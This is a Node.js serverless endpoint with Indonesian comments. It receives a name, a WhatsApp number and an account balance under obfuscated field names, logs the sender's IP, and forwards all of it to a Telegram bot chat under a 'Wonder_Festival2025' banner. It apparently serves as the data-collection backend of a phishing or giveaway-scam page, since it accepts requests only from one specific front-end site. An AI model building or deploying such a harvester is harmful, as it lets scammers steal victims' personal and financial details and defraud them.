const axios = require('axios');

// Store untuk menyimpan data rate limiting
const requestStore = new Map();

// Konfigurasi rate limiting
const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 menit
const MAX_REQUESTS_PER_WINDOW = 5; // Maksimal 5 request per 15 menit

// Fungsi untuk membersihkan store lama
setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of requestStore.entries()) {
    if (now - data.firstRequestTime > RATE_LIMIT_WINDOW_MS) {
      requestStore.delete(ip);
    }
  }
}, 60 * 1000); // Cleanup setiap 1 menit

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', 'https://cek-two.vercel.app');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    // Dapatkan IP address pengguna untuk rate limiting
    const userIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                   'unknown-ip';

    // Cek rate limiting
    const now = Date.now();
    const ipData = requestStore.get(userIP);

    if (ipData) {
      // Jika masih dalam window time
      if (now - ipData.firstRequestTime <= RATE_LIMIT_WINDOW_MS) {
        if (ipData.count >= MAX_REQUESTS_PER_WINDOW) {
          return res.status(429).json({ 
            success: false, 
            message: `Terlalu banyak request. Silakan coba lagi dalam ${Math.ceil((RATE_LIMIT_WINDOW_MS - (now - ipData.firstRequestTime)) / 60000)} menit.` 
          });
        }
        ipData.count += 1;
      } else {
        // Reset counter jika window time sudah lewat
        requestStore.set(userIP, {
          count: 1,
          firstRequestTime: now
        });
      }
    } else {
      // IP baru, simpan ke store
      requestStore.set(userIP, {
        count: 1,
        firstRequestTime: now
      });
    }

    const { a: name, b: phone, c: balance } = req.body;

    // Validasi input
    if (!name || !phone || !balance) {
      return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
    }

    if (!/^08[0-9]{8,13}$/.test(phone)) {
      return res.status(400).json({ success: false, message: 'Nomor WhatsApp tidak valid' });
    }

    // Validasi length input
    if (name.length > 100 || phone.length > 15 || balance.length > 50) {
      return res.status(400).json({ success: false, message: 'Input terlalu panjang' });
    }

    // Ambil token dari environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ success: false, message: 'Server configuration error' });
    }

    // Format pesan untuk Telegram dengan informasi IP
    const telegramMessage = `
𝗪𝗼𝗻𝗱𝗲𝗿_𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹𝟮𝟬𝟮𝟱
────────────────────
𝗡𝗮𝗺𝗮 | ${name}
𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 | <code>${phone}</code>
𝗦𝗮𝗹𝗱𝗼 | <pre>${balance}</pre>
────────────────────
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP}
𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗞𝗲 | ${ipData ? ipData.count : 1}
    `;

    // Kirim ke Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: telegramMessage,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });

    // Response sukses
    res.status(200).json({ 
      success: true, 
      message: 'Data berhasil dikirim',
      remaining: MAX_REQUESTS_PER_WINDOW - (ipData ? ipData.count : 1)
    });

  } catch (error) {
    console.error('Error:', error.message);
    
    // Berikan pesan error yang lebih spesifik
    let errorMessage = 'Terjadi kesalahan server';
    if (error.response) {
      // Error dari Telegram API
      errorMessage = `Error Telegram: ${error.response.data.description || error.response.status}`;
    } else if (error.request) {
      // Tidak ada response dari Telegram
      errorMessage = 'Tidak dapat terhubung ke Telegram API';
    }
    
    res.status(500).json({ success: false, message: errorMessage });
  }
};
